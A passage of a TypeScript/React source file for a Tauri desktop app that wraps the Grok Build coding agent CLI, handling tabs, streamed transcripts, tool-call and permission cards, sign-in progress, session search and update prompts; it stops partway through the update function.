import { memo, useCallback, useEffect, useMemo, useRef, useState } from "react";
import Markdown from "markdown-to-jsx";
import { SplitDiff } from "./SplitDiff";
import { getCurrentWebview } from "@tauri-apps/api/webview";
import { getCurrentWebviewWindow } from "@tauri-apps/api/webviewWindow";
import { open } from "@tauri-apps/plugin-dialog";
import { openUrl } from "@tauri-apps/plugin-opener";
import { check, type Update } from "@tauri-apps/plugin-updater";
import { relaunch } from "@tauri-apps/plugin-process";
import {
  authStatus,
  installGrok,
  recentProjects,
  listSessions,
  searchSessions,
  connect,
  authenticate,
  openSession,
  loadSession,
  sendPrompt,
  cancelRun,
  respondPermission,
  respondHook,
  openProject,
  windowProject,
  pendingResume,
  busySessions,
  shutdownAll,
  subscribe,
  listProjectFiles,
  grokVersion,
  readonlyTools,
  rewindPoints,
  rewindExecute,
  type AuthMethod,
  type AuthStatus,
  type AvailableCommand,
  type PermissionRequest,
  type Project,
  type RewindPoint,
  type SearchHit,
  type SessionMeta,
  type SessionModelInfo,
  type SessionUpdate,
} from "./lib/bridge";
import { toolFieldsFromCall, mergeToolUpdate, type ToolFields } from "./lib/toolMeta";
import { ToolCard } from "./ToolCard";
import { CodeBlock } from "./CodeBlock";
import { CommandPalette, type PaletteAction } from "./CommandPalette";
import { Autocomplete, type AcItem } from "./Autocomplete";
import { Preferences } from "./Preferences";
import { MessageActions } from "./MessageActions";
import { RewindPanel } from "./RewindPanel";
import { normalizeRewindPoints, type RewindMode } from "./lib/rewind";
import { TasksPanel } from "./TasksPanel";
import { ReceiptPanel } from "./ReceiptPanel";
import { parseNotify, mergeTask, type TaskItem } from "./lib/notify";
import { filterSlash, filterFiles, detectTrigger, applyPick } from "./lib/commands";
import { isThemePref, applyTheme, type ThemePref } from "./lib/theme";
import "./App.css";

// Installation is global. A *window* owns one project folder (Rust decides which,
// via `open_project`; we learn it by asking `window_project`), and each tab inside
// that window is one conversation in that folder.
//
// `ready` means "this window has no project yet" — the launcher. `chat` means it
// has one. The two are kept in lockstep with `projectCwd`, which is what the
// render actually branches on, so a stage that drifts can't make the UI lie.
export type Stage = "checking" | "needs-install" | "installing" | "ready" | "chat";

/// A tool call in the transcript. `ToolFields` (see lib/toolMeta.ts) carries everything
/// that can be known about the call itself — title, status, meta, raw input/output,
/// content, locations — parsed the same way whether it arrives via replay or live.
/// `startedAt`/`endedAt` are ours alone: they're wall-clock stamps for the duration shown
/// on the card, and replay has no "live" moment to stamp, so only the live path sets them.
export interface ToolItem extends ToolFields {
  id: string;
  kind: "tool";
  startedAt?: number;
  endedAt?: number;
}
export interface TextItem {
  id: string;
  kind: "answer" | "thought" | "you" | "error";
  text: string;
}
export interface AskItem {
  id: string;
  kind: "ask";
  req: PermissionRequest;
  /// The option the user picked, set only once Rust has *accepted* the answer.
  decided: string | null;
  /// Why the answer didn't land. Rust rejects a decision for a request this window
  /// doesn't own, so "you clicked it" and "it counted" are no longer the same
  /// thing and must not render the same way.
  failed: string | null;
}
export interface PlanItem {
  id: string;
  kind: "plan";
  entries: { content: string; status?: string; priority?: string }[];
}
export interface UsageItem {
  id: string;
  kind: "usage";
  modelId?: string;
  totalTokens?: number;
  inputTokens?: number;
  outputTokens?: number;
  reasoningTokens?: number;
  cachedReadTokens?: number;
  apiDurationMs?: number;
}
export type Item = ToolItem | TextItem | AskItem | PlanItem | UsageItem;

/// Where a sign-in is up to. Rust only ever tells us the *outcome* (`acp-auth` is
/// `ok | failed | timed_out`), so every in-flight state below is ours alone:
/// `contacting` and `browser` are split by our own 1.5s timer, and `opening` is
/// the post-auth `openSession` wait — a stage no backend knows about.
export type AuthPending = "contacting" | "browser" | "opening" | null;

export interface Tab {
  id: string;
  /// Always the owning window's project. A tab can no longer lack one: you reach
  /// a tab strip only through a window that already has a folder.
  cwd: string;
  sessionId: string | null;
  /// The conversation this tab is *becoming*, from the click until `loadSession`
  /// resolves. Without it a second click during that gap finds no tab carrying
  /// the session id yet and opens a duplicate of the conversation already loading.
  loadingSessionId: string | null;
  /// The conversation's own title, once we've opened a stored one. `null` is an
  /// unsaved new chat — every tab in a window shares the folder, so the folder
  /// name would name them all the same thing.
  title: string | null;
  items: Item[];
  busy: boolean;
  draft: string;
  attachments: string[];
  usageTokens: number;
  needsAuth: boolean;
  authMethods: AuthMethod[];
  /// A connect/open-session is in flight for this tab. The promise still decides
  /// the outcome; this only decides whether we show that we're waiting.
  connecting: boolean;
  /// Copy for the newest recognized `acp-connect` stage. Decoration, never state.
  connectLine: string | null;
  /// The ~400ms and ~3s gates: a wait too short to notice shouldn't be narrated.
  connectShowLine: boolean;
  connectShowCancel: boolean;
  authPending: AuthPending;
  /// This tab's own failure — folder open, connect, or sign-in. Kept per-tab so a
  /// folder error can never surface on another tab's screen.
  error: string | null;
  /// Grok's advertised slash commands for this session, from the most recent
  /// `available_commands_update`. `undefined` until the first one arrives —
  /// the "/" autocomplete just shows nothing until then, never a stale list
  /// from a different session.
  availableCommands?: AvailableCommand[];
  /// Cached `listProjectFiles(cwd)` result for the "@" mention autocomplete.
  /// Fetched lazily on the first "@" trigger and cached here so retyping "@"
  /// doesn't re-walk the project tree on every keystroke.
  projectFiles?: string[];
  /// Model/reasoning-effort state from the most recent `acp-session-info`
  /// (carried on `session/new`/`session/load`). `undefined` until the CLI
  /// has actually told us — the Preferences "Model" section falls back to
  /// "Unknown" rather than assuming a model that was never confirmed.
  sessionInfo?: SessionModelInfo;
  /// Grok's background work for this tab — spawned subagents, backgrounded/
  /// scheduled tasks — accumulated from `x.ai/session_notification` events via
  /// `parseNotify`/`mergeTask`. `undefined` until the first relevant notification
  /// arrives; never touched by `reduceUpdates`/replay (notify isn't an
  /// `acp-update`, it's a separate, non-standard side channel).
  tasks?: TaskItem[];
}

let nextTabId = 1;
let nextItemId = 1;

function createTab(cwd: string): Tab {
  return {
    id: `tab-${nextTabId++}`,
    cwd,
    sessionId: null,
    loadingSessionId: null,
    title: null,
    items: [],
    busy: false,
    draft: "",
    attachments: [],
    usageTokens: 0,
    needsAuth: false,
    authMethods: [],
    connecting: false,
    connectLine: null,
    connectShowLine: false,
    connectShowCancel: false,
    authPending: null,
    error: null,
  };
}

/// `acp-connect` stages are verbatim, non-exhaustive labels. Anything not in this
/// table simply doesn't render: an unknown stage is a missing sentence, not a bug.
/// `failed` is absent on purpose — the rejected promise owns every error message.
export const CONNECT_COPY: Record<string, string> = {
  spawning: "Starting Grok Build…",
  handshaking: "Connecting to Grok Build…",
  needs_auth: "Checking your sign-in…",
  session: "Opening your project…",
  ready: "Almost ready…",
};

/// The installer's stages, mapped from its own stderr. No byte counts and no
/// percentage: nothing here reports a total, so any number would be invented.
export const INSTALL_COPY: Record<string, string> = {
  resolving: "Finding the latest version…",
  downloading: "Downloading Grok Build…",
  configuring: "Setting up your PATH…",
  installing: "Installing…",
};

function itemId(prefix: string): string {
  return `${prefix}-${nextItemId++}`;
}

export const isTool = (i: Item): i is ToolItem => i.kind === "tool";
export const isAsk = (i: Item): i is AskItem => i.kind === "ask";
export const isPlan = (i: Item): i is PlanItem => i.kind === "plan";
export const isUsage = (i: Item): i is UsageItem => i.kind === "usage";
export const isText = (i: Item): i is TextItem => !isTool(i) && !isAsk(i) && !isPlan(i) && !isUsage(i);

export function isFiniteNumber(value: number | undefined): value is number {
  return typeof value === "number" && Number.isFinite(value);
}

const STARTERS = [
  "Explain how this codebase is structured",
  "Find and fix a bug",
  "Add tests for a file I point you to",
] as const;

export function folderName(path: string): string {
  const parts = path.split(/[/\\]/).filter(Boolean);
  return parts[parts.length - 1] ?? path;
}

export function toMention(cwd: string | null, absPath: string): string {
  const path = cwd && (absPath === cwd || absPath.startsWith(`${cwd}/`))
    ? absPath.slice(absPath === cwd ? cwd.length : cwd.length + 1)
    : absPath;
  return path.includes(" ") ? `@"${path}"` : `@${path}`;
}

export function isImagePath(path: string): boolean {
  return /\.(png|jpe?g|gif|webp|svg|bmp|ico)$/i.test(path);
}

export function reduceUpdates(updates: SessionUpdate[]): Item[] {
  type Reduction = {
    items: Item[];
    answerId?: string;
    thoughtId?: string;
  };

  return updates.reduce<Reduction>(
    (state, update, index) => {
      switch (update.sessionUpdate) {
        case "agent_message_chunk": {
          const id = state.answerId ?? `ans-${index}`;
          const text = update.content?.text ?? "";
          const exists = state.items.some((item) => isText(item) && item.id === id);
          return {
            ...state,
            answerId: id,
            items: exists
              ? state.items.map((item) =>
                  isText(item) && item.id === id ? { ...item, text: item.text + text } : item,
                )
              : [...state.items, { id, kind: "answer", text }],
          };
        }
        case "agent_thought_chunk": {
          const id = state.thoughtId ?? `th-${index}`;
          const text = update.content?.text ?? "";
          const exists = state.items.some((item) => isText(item) && item.id === id);
          return {
            ...state,
            thoughtId: id,
            items: exists
              ? state.items.map((item) =>
                  isText(item) && item.id === id ? { ...item, text: item.text + text } : item,
                )
              : [...state.items, { id, kind: "thought", text }],
          };
        }
        case "user_message_chunk":
          return {
            items: [
              ...state.items,
              { id: `you-${index}`, kind: "you", text: update.content?.text ?? "" },
            ],
          };
        // Replay has no "live" moment, so these two go through the same pure
        // toolMeta.ts helpers the live path uses (below) but stamp no timestamps —
        // a card replayed from history never shows a duration it didn't earn.
        case "tool_call":
          return {
            items: [
              ...state.items,
              {
                id: update.toolCallId ?? `tool-${index}`,
                kind: "tool",
                ...toolFieldsFromCall(update),
              },
            ],
          };
        case "tool_call_update":
          return {
            ...state,
            items: state.items.map((item) =>
              isTool(item) && item.id === update.toolCallId
                ? { ...item, ...mergeToolUpdate(item, update) }
                : item,
            ),
          };
        case "plan": {
          const plan: PlanItem = { id: "plan", kind: "plan", entries: update.entries ?? [] };
          const hasPlan = state.items.some(isPlan);
          return {
            items: hasPlan ? state.items.map((item) => (isPlan(item) ? plan : item)) : [...state.items, plan],
          };
        }
        default:
          return state;
      }
    },
    { items: [] },
  ).items;
}

/// The connect line, or null while there's nothing worth saying: before the 400ms
/// gate, or once the promise has settled. Falls back to a generic line because
/// `acp-connect` is decoration and may never arrive.
export function connectLineFor(tab: Tab): string | null {
  if (!tab.connecting || !tab.connectShowLine) return null;
  return tab.connectLine ?? "Connecting to your project…";
}

/// What the sign-in screen is waiting on. `contacting` says nothing on purpose —
/// under 1.5s there's nothing to report and a flash would be noise.
export function authLine(tab: Tab): string | null {
  if (tab.authPending === "browser") return "A browser window will open — finish signing in there.";
  // `finishSignIn` arms `beginConnect` in the same breath as `opening`, so this
  // fallback covers the 400ms before the gate opens. It has to be the line the
  // gate then falls back to, or the wait renames itself mid-flight.
  if (tab.authPending === "opening") return connectLineFor(tab) ?? "Connecting to your project…";
  return null;
}

/// All `openConversation` needs to open one. `SessionMeta` satisfies it; so does the
/// `--resume` path, which knows the id and the folder but may not have the title.
type ConversationRef = Pick<SessionMeta, "id" | "cwd" | "title">;

export function sessionDate(value: string): string {
  const date = new Date(value);
  return Number.isNaN(date.getTime()) ? value : date.toLocaleDateString();
}

/// The markers Rust wraps matched terms in (see `SNIPPET_OPEN`/`SNIPPET_CLOSE`).
/// Control characters, not brackets, so a literal `[TODO]` quoted out of a transcript
/// can't be mistaken for a hit.
const SNIPPET_OPEN = "";
const SNIPPET_CLOSE = "";

/// One run of snippet text; `mark` is a term the query actually matched.
export interface SnippetPart {
  text: string;
  mark: boolean;
}

/// Split a snippet into plain and matched runs, dropping the markers.
///
/// This is why the snippet crosses the wire as delimited text and not as HTML: the
/// content is verbatim text from the user's own conversations, so building markup from
/// it in Rust and injecting it here would be an HTML-injection hole in exchange for
/// nothing. React escapes each run as an ordinary string.
///
/// Unbalanced markers can't throw — a snippet is quoted prose, and the renderer must
/// never be the thing that breaks the sidebar. An unclosed run simply reads to the end.
export function splitSnippet(snippet: string): SnippetPart[] {
  const parts: SnippetPart[] = [];
  const push = (text: string, mark: boolean) => {
    if (text) parts.push({ text, mark });
  };

  // Everything before the first `open` is plain; every chunk after one begins a match
  // that runs until its `close`. Keyed off the chunk INDEX, not off what's been pushed
  // so far: a snippet starting with a marker makes the first chunk empty, and using
  // `parts.length` as a stand-in for "first chunk" silently mis-flags that leading match
  // as plain text.
  snippet.split(SNIPPET_OPEN).forEach((chunk, index) => {
    if (index === 0) {
      // A `close` with no `open` before it is stray: keep the words, drop the marker.
      push(chunk.split(SNIPPET_CLOSE).join(""), false);
      return;
    }
    const [marked, ...rest] = chunk.split(SNIPPET_CLOSE);
    push(marked, true);
    push(rest.join(SNIPPET_CLOSE), false);
  });
  return parts;
}

/// A sidebar row: the conversation, plus the evidence for why it's on screen.
export interface SessionRow {
  session: SessionMeta;
  snippet: string | null;
}

/// Turn a search answer into the rows to render, in the order to render them.
///
/// Rust owns the ranking (title hits first, then content by bm25), so this maps ids back
/// to sessions IN HIT ORDER rather than re-sorting. Re-deriving an order here would be a
/// second opinion about relevance that could quietly disagree with the one that did the
/// searching.
///
///   * no query        -> every conversation, unfiltered.
///   * `hits === null` -> the search itself failed. Fall back to a local title filter so
///                        the sidebar still works; the caller shows the error, because a
///                        short list presented as the whole answer is the deceptive case.
///   * otherwise       -> the hits, in order. A hit naming a conversation this window
///                        doesn't know is dropped: we can't render a row for a session
///                        we have no title or date for.
export function sessionRows(
  sessions: SessionMeta[],
  hits: SearchHit[] | null,
  query: string,
): SessionRow[] {
  const needle = query.trim().toLocaleLowerCase();
  if (!needle) return sessions.map((session) => ({ session, snippet: null }));

  if (hits === null) {
    return sessions
      .filter((session) => session.title.toLocaleLowerCase().includes(needle))
      .map((session) => ({ session, snippet: null }));
  }

  const byId = new Map(sessions.map((session) => [session.id, session]));
  const rows: SessionRow[] = [];
  for (const hit of hits) {
    const session = byId.get(hit.id);
    if (session) rows.push({ session, snippet: hit.snippet });
  }
  return rows;
}

export default function App() {
  const [stage, setStage] = useState<Stage>("checking");
  /// This window's project, straight from Rust. `null` is a launcher window.
  const [projectCwd, setProjectCwd] = useState<string | null>(null);
  const [tabs, setTabs] = useState<Tab[]>([]);
  const [activeTabId, setActiveTabId] = useState<string | null>(null);
  const [dragging, setDragging] = useState(false);
  // Whether the conversation sidebar is showing. Persisted so a window that was opened with
  // it collapsed comes back collapsed — the choice is the user's, not reset every launch.
  const [sidebarOpen, setSidebarOpen] = useState(() => {
    try {
      return localStorage.getItem("sidebarOpen") !== "false";
    } catch {
      return true;
    }
  });
  // Theme preference (Light/Dark/System), persisted the same way `sidebarOpen`
  // is: read once at init, written back on every change. "system" is the
  // default so a first launch matches the OS instead of forcing light/dark.
  const [theme, setTheme] = useState<ThemePref>(() => {
    try {
      const stored = localStorage.getItem("theme");
      return isThemePref(stored) ? stored : "system";
    } catch {
      return "system";
    }
  });
  // The Preferences overlay (gear button / ⌘, / palette action). Not a Stage —
  // it floats over whatever screen is already showing, like the command palette.
  const [prefsOpen, setPrefsOpen] = useState(false);
  // The Tasks overlay (titlebar button / palette action) — a read-only view of
  // the active tab's `tasks`, floating over whatever screen is showing, same
  // idiom as `prefsOpen` above.
  const [tasksOpen, setTasksOpen] = useState(false);
  // The Receipt overlay (command palette action) — a shareable Markdown export
  // of the active tab's transcript, floating over whatever screen is showing,
  // same idiom as `prefsOpen`/`tasksOpen` above.
  const [receiptOpen, setReceiptOpen] = useState(false);
  // The CLI's `--version` output, fetched lazily the first time Preferences'
  // About section is opened and cached here so re-opening it doesn't re-spawn
  // the subprocess every time.
  const [cliVersion, setCliVersion] = useState<string | null>(null);
  // The app's hardcoded default-deny read-only tool allowlist, fetched once
  // for Preferences' "Tools & Safety" section — mirrors cliVersion's lazy,
  // cache-on-first-open pattern below.
  const [readonlyToolsList, setReadonlyToolsList] = useState<string[] | undefined>(undefined);
  // Full auth/install status, captured at bootstrap alongside the existing
  // `grok_installed` check — About needs the path and sign-in state too.
  const [authInfo, setAuthInfo] = useState<AuthStatus | null>(null);
  const [notice, setNotice] = useState<string | null>(null);
  const [recents, setRecents] = useState<Project[]>([]);
  /// An `open_project` is in flight. Decoration for the launcher's wait, nothing
  /// more — the promise still owns the outcome.
  const [openingProject, setOpeningProject] = useState(false);
  const [historySessions, setHistorySessions] = useState<SessionMeta[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [historyQuery, setHistoryQuery] = useState("");
  // `null` means "the backend gave us no usable answer" (the search hasn't run, or the
  // whole command rejected) — distinct from `[]`, which is a real "nothing matched".
  // Only the null case falls back to the local title filter.
  const [historySearchHits, setHistorySearchHits] = useState<SearchHit[] | null>(null);
  const [historySearching, setHistorySearching] = useState(false);
  const [historySearchError, setHistorySearchError] = useState<string | null>(null);
  const [historyListError, setHistoryListError] = useState<string | null>(null);
  const [historyRevision, setHistoryRevision] = useState(0);
  const [update, setUpdate] = useState<Update | null>(null);
  const [updating, setUpdating] = useState(false);
  /// Non-null while the banner is asking "this will stop N conversations — sure?".
  /// `busy: null` inside means the count itself failed.
  const [updateGate, setUpdateGate] = useState<{ busy: number | null } | null>(null);
  const [installLine, setInstallLine] = useState<string | null>(null);
  const [installDetail, setInstallDetail] = useState<string | null>(null);
  // Cmd/Ctrl+K command palette (app actions, not grok's slash commands).
  const [paletteOpen, setPaletteOpen] = useState(false);
  // The composer textarea's caret offset, kept in state because detectTrigger
  // needs it on every render, not just on change — a plain click or arrow-key
  // move can open or close a trigger without the draft text itself changing.
  const [composerCaret, setComposerCaret] = useState(0);
  // Which row of the slash/@ dropdown is highlighted.
  const [acIndex, setAcIndex] = useState(0);
  // Esc hides the dropdown without touching the draft; it re-arms the next
  // time the trigger itself changes (new "/" or "@", or the query changes),
  // so dismissing "/f" doesn't also suppress "/fo" a keystroke later.
  const [acDismissed, setAcDismissed] = useState(false);
  // Rewind panel state. `rewindOpen` gates rendering `<RewindPanel/>` at all;
  // the rest mirror the panel's own props 1:1 so App stays the single owner
  // of "what points do we have" / "are we still fetching them" / "did the
  // fetch fail" — the panel itself never calls the bridge.
  const [rewindOpen, setRewindOpen] = useState(false);
  const [rewindPointsList, setRewindPointsList] = useState<RewindPoint[]>([]);
  const [rewindLoading, setRewindLoading] = useState(false);
  const [rewindError, setRewindError] = useState<string | null>(null);
  const [rewindFocusId, setRewindFocusId] = useState<string | null>(null);

  const scrollRef = useRef<HTMLDivElement>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const searchInputRef = useRef<HTMLInputElement>(null);
  // `session/load` replays before its response. Keep those normal ACP updates
  // together, then render the whole replay through the history reducer.
  const sessionReplays = useRef<Map<string, SessionUpdate[]>>(new Map());
  // A warm sign-in returns in well under a second. Wait 1.5s before promising a
  // browser window, so re-authenticating an already-valid login doesn't flash
  // instructions for something that never happens.
  const authTimers = useRef<Map<string, number>>(new Map());
  // The 400ms line gate and the 3s Cancel gate, per tab.
  const connectTimers = useRef<Map<string, number[]>>(new Map());
  const tabsRef = useRef(tabs);
  const addRunRef = useRef<() => Promise<void>>(async () => {});
  // Chunks stream in one fragment at a time; keep appending to the same bubble
  // until something else happens rather than making a bubble per fragment.
  const openBubbles = useRef<Map<string, { answer?: string; thought?: string }>>(new Map());
  // Grok resends the whole plan as it evolves; update one card in place per turn.
  const planIds = useRef<Map<string, string | null>>(new Map());

  tabsRef.current = tabs;
  const activeTab = tabs.find((tab) => tab.id === activeTabId) ?? null;

  const updateTab = useCallback((tabId: string, updateTabState: (tab: Tab) => Tab) => {
    setTabs((current) => {
      const nextTabs = current.map((tab) => (tab.id === tabId ? updateTabState(tab) : tab));
      tabsRef.current = nextTabs;
      return nextTabs;
    });
  }, []);

  const updateActiveTab = useCallback(
    (updateTabState: (tab: Tab) => Tab) => {
      if (activeTabId) updateTab(activeTabId, updateTabState);
    },
    [activeTabId, updateTab],
  );

  const clearAuthTimer = useCallback((tabId: string) => {
    const timer = authTimers.current.get(tabId);
    if (timer !== undefined) window.clearTimeout(timer);
    authTimers.current.delete(tabId);
  }, []);

  const clearConnectTimers = useCallback((tabId: string) => {
    connectTimers.current.get(tabId)?.forEach((timer) => window.clearTimeout(timer));
    connectTimers.current.delete(tabId);
  }, []);

  /// Start showing that we're waiting. The `connect`/`openSession` promise is
  /// still what decides the outcome — this only arms the two gates.
  const beginConnect = useCallback(
    (tabId: string) => {
      clearConnectTimers(tabId);
      updateTab(tabId, (tab) => ({
        ...tab,
        connecting: true,
        connectLine: null,
        connectShowLine: false,
        connectShowCancel: false,
        error: null,
      }));
      connectTimers.current.set(tabId, [
        // A warm connect beats this; a line that appears and vanishes inside
        // 400ms reads as a glitch, not as progress.
        window.setTimeout(
          () => updateTab(tabId, (tab) => (tab.connecting ? { ...tab, connectShowLine: true } : tab)),
          400,
        ),
        // Cancel exists to escape a wait, so it shows up once there is one.
        window.setTimeout(
          () => updateTab(tabId, (tab) => (tab.connecting ? { ...tab, connectShowCancel: true } : tab)),
          3000,
        ),
      ]);
    },
    [clearConnectTimers, updateTab],
  );

  const endConnect = useCallback(
    (tabId: string) => {
      clearConnectTimers(tabId);
      updateTab(tabId, (tab) => ({
        ...tab,
        connecting: false,
        connectLine: null,
        connectShowLine: false,
        connectShowCancel: false,
      }));
    },
    [clearConnectTimers, updateTab],
  );

  // `closeTab` clears a tab's timers, but a tab that is still open when the app
  // goes away never passes through it. Clear every armed timer, not just the
  // active tab's, so nothing is left to fire into a component that's gone.
  useEffect(() => {
    const pendingAuth = authTimers.current;
    const pendingConnect = connectTimers.current;
    return () => {
      pendingAuth.forEach((timer) => window.clearTimeout(timer));
      pendingAuth.clear();
      pendingConnect.forEach((timers) => timers.forEach((timer) => window.clearTimeout(timer)));
      pendingConnect.clear();
    };
  }, []);

  // Persist the theme choice the same way `sidebarOpen` is persisted above.
  useEffect(() => {
    try {
      localStorage.setItem("theme", theme);
    } catch {
      // A private-mode window with no storage still works; it just won't remember the choice.
    }
  }, [theme]);

  // Paint the choice, and for "system" stay in sync with OS changes while
  // that preference is active — a user who leaves this on "system" and then
  // flips their OS appearance shouldn't need to reopen the app to see it.
  useEffect(() => {
    applyTheme(theme);
    if (theme !== "system") return;
    const mql = window.matchMedia("(prefers-color-scheme: dark)");
    const onChange = () => applyTheme(theme);
    mql.addEventListener("change", onChange);
    return () => mql.removeEventListener("change", onChange);
  }, [theme]);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: "smooth" });
  }, [activeTab?.items, activeTab?.busy]);

  useEffect(() => {
    try {
      localStorage.setItem("sidebarOpen", String(sidebarOpen));
    } catch {
      // A private-mode window with no storage still works; it just won't remember the choice.
    }
  }, [sidebarOpen]);

  // Ask Rust what this window is: is grok installed, and does this window already
  // own a project? A window built by `open_project` comes up straight into a new
  // chat in that folder; only a window that genuinely has no project shows the
  // launcher. Guarded by a ref because this arm spawns a grok process, and
  // StrictMode's development double-invoke would otherwise spawn two.
  const bootstrapped = useRef(false);
  useEffect(() => {
    if (bootstrapped.current) return;
    bootstrapped.current = true;
    void (async () => {
      // Ask first: it decides which screen we land on, and an install failure
      // shouldn't lose the answer.
      const cwd = await windowProject().catch(() => null);
      setProjectCwd(cwd);
      const status = await authStatus().catch(() => null);
      setAuthInfo(status);
      const installed = status?.grok_installed ?? false;
      if (!installed) {
        setStage("needs-install");
        return;
      }
      if (!cwd) {
        setStage("ready");
        return;
      }
      // Consuming, and null for almost every launch. Null is a new chat — the
      // ordinary case — so it says nothing and shows nothing.
      const resume = await pendingResume().catch(() => null);
      await enterProject(cwd, resume);
    })();
  }, []);

  // Refresh the recents whenever we're back at the launcher — the CLI may have
  // gained sessions since last time (including from the terminal).
  useEffect(() => {
    if (stage === "ready") recentProjects().then(setRecents).catch(() => setRecents([]));
  }, [stage]);

  // The sidebar is scoped to the window: a launcher lists every conversation on
  // the machine (that list is how you *find* a project), a project window lists
  // only the conversations made in its folder. `undefined` is the "all of them"
  // arm of Rust's `Option<String>` — the store already keys sessions by cwd, so
  // there is no matching to invent here.
  useEffect(() => {
    if (stage !== "ready" && stage !== "chat") return;
    let cancelled = false;
    setHistoryLoading(true);
    setHistoryListError(null);
    listSessions(projectCwd ?? undefined)
      .then((sessions) => {
        if (!cancelled) setHistorySessions(sessions);
      })
      .catch((error) => {
        if (!cancelled) {
          setHistorySessions([]);
          setHistoryListError(String(error));
        }
      })
      .finally(() => {
        if (!cancelled) setHistoryLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [stage, historyRevision, projectCwd]);

  useEffect(() => {
    if (stage !== "ready" && stage !== "chat") return;
    const query = historyQuery.trim();
    setHistorySearchHits(null);
    setHistorySearchError(null);
    if (!query) {
      setHistorySearching(false);
      return;
    }

    let cancelled = false;
    setHistorySearching(true);
    const timer = window.setTimeout(() => {
      searchSessions(query, projectCwd ?? undefined)
        .then((results) => {
          if (!cancelled) {
            // A degraded search still has real title hits in `hits` — take them AND
            // show the warning. The two are not alternatives.
            setHistorySearchHits(results.hits);
            setHistorySearchError(results.content_error);
          }
        })
        .catch((error) => {
          // A failed search is not an empty search. Silently falling back to the
          // local title filter told the user "No matches" — a flat lie about
          // conversations that are sitting right there on disk.
          if (!cancelled) {
            setHistorySearchHits(null);
            setHistorySearchError(`Couldn't search conversation contents: ${error}`);
          }
        })
        .finally(() => {
          if (!cancelled) setHistorySearching(false);
        });
    }, 250);

    return () => {
      cancelled = true;
      window.clearTimeout(timer);
    };
  }, [historyQuery, stage, projectCwd]);

  // Offer updates rather than forcing them: an agent mid-task shouldn't be
  // restarted out from under the user. `check()` is a no-op in dev.
  useEffect(() => {
    check()
      .then((u) => u && setUpdate(u))
      .catch(() => {});
  }, []);

  // The CLI version subprocess only needs to run once Preferences' About
  // section is actually looked at, and only once ever per window — cached
  // in `cliVersion` so a second open doesn't re-spawn `grok --version`.
  useEffect(() => {
    if (!prefsOpen || cliVersion !== null) return;
    let cancelled = false;
    grokVersion()
      .then((v) => {
        if (!cancelled) setCliVersion(v);
      })
      .catch(() => {});
    return () => {
      cancelled = true;
    };
  }, [prefsOpen, cliVersion]);

  // Same lazy-and-cache pattern as cliVersion above: the readonly allowlist
  // is a static Rust-side constant, but there's no reason to invoke it before
  // Preferences' "Tools & Safety" section is actually looked at.
  useEffect(() => {
    if (!prefsOpen || readonlyToolsList !== undefined) return;
    let cancelled = false;
    readonlyTools()
      .then((tools) => {
        if (!cancelled) setReadonlyToolsList(tools);
      })
      .catch(() => {});
    return () => {
      cancelled = true;
    };
  }, [prefsOpen, readonlyToolsList]);

  useEffect(() => {
    let cancelled = false;
    let unlisten: (() => void) | undefined;

    // The 9th listener — `subscribe()` owns the other 8. Window-scoped like them:
    // the tray resolves a specific window and `emit_to`s it, so a broadcast
    // listener here would open a new chat in every window at once.
    getCurrentWebviewWindow()
      .listen("tray-new-chat", () => {
        void addRunRef.current();
      })
      .then((stopListening) => {
        if (cancelled) stopListening();
        else unlisten = stopListening;
      })
      .catch(() => {});

    return () => {
      cancelled = true;
      unlisten?.();
    };
  }, []);

  useEffect(() => {
    const dropTabId = activeTab?.id;
    const dropCwd = activeTab?.cwd;
    if (stage !== "chat" || !dropTabId || !dropCwd) {
      setDragging(false);
      return;
    }

    let cancelled = false;
    let unlisten: (() => void) | undefined;

    getCurrentWebview()
      .onDragDropEvent(({ payload }) => {
        if (payload.type === "enter" || payload.type === "over") {
          setDragging(true);
        } else if (payload.type === "leave") {
          setDragging(false);
        } else if (payload.type === "drop") {
          setDragging(false);
          updateTab(dropTabId, (tab) => ({
            ...tab,
            attachments: [...new Set([...tab.attachments, ...(payload.paths ?? [])])],
          }));
        }
      })
      .then((stopListening) => {
        if (cancelled) stopListening();
        else unlisten = stopListening;
      })
      .catch(() => {
        if (!cancelled) setDragging(false);
      });

    return () => {
      cancelled = true;
      unlisten?.();
    };
  }, [activeTab?.cwd, activeTab?.id, stage, updateTab]);

  // Cmd/Ctrl+W closes the active tab. It only closes the *window* once there is no tab left
  // to close — so the last tab's close drops you on the empty "nothing open" state, and a
  // second Cmd+W from there closes the window. Closing the window out from under the last
  // tab in one press was the surprising outcome; a tab close should stay a tab close.
  useEffect(() => {
    const onKeyDown = (event: KeyboardEvent) => {
      if (!(event.metaKey || event.ctrlKey) || event.altKey || event.shiftKey) return;
      // Cmd/Ctrl+B toggles the sidebar — the editor-standard shortcut, so it's where the
      // hand already reaches for it.
      if (event.key === "b" || event.key === "B") {
        event.preventDefault();
        setSidebarOpen((open) => !open);
        return;
      }
      // Cmd/Ctrl+K opens the app-action command palette.
      if (event.key === "k" || event.key === "K") {
        event.preventDefault();
        setPaletteOpen(true);
        return;
      }
      // Cmd/Ctrl+, opens Preferences — the platform-standard shortcut.
      if (event.key === ",") {
        event.preventDefault();
        setPrefsOpen(true);
        return;
      }
      if (event.key !== "w" && event.key !== "W") return;
      event.preventDefault();
      const openTab = activeTabId;
      if (openTab) {
        // Even if it's the last one: closing it leaves the window on its empty state, not gone.
        closeTab(openTab);
        return;
      }
      // Nothing open (the empty state, or a launcher) — now Cmd+W closes the window.
      void getCurrentWebviewWindow().close().catch(() => {});
    };
    window.addEventListener("keydown", onKeyDown);
    return () => window.removeEventListener("keydown", onKeyDown);
  }, [activeTabId]);

  /// The banner's Update button. Updating restarts the whole app, which takes
  /// every window's agent down with it — so count them first and say so. Still an
  /// offer, not a block: refusing to update while anything is running is exactly
  /// the "restarted out from under the user" behaviour this app avoids.
  ///
  /// The gate is the banner itself, not a modal. `window.confirm` is not an option
  /// here — wry's `WKUIDelegate` doesn't implement `runJavaScriptConfirmPanel`, so
  /// on macOS it returns false with no dialog and the button would silently do
  /// nothing — and the dialog plugin's `confirm` isn't in our granted permissions.
  async function askUpdate() {
    if (!update) return;
    // A count we couldn't take is not a count of zero. `null` still gates, with
    // copy that doesn't pretend to a number we don't have.
    const busy = await busySessions().catch(() => null);
    if (busy === 0) {
      await runUpdate();
      return;
    }
    setUpdateGate({ busy });
  }

  async function runUpdate() {
    if (!update) return;
    setUpdating(true);
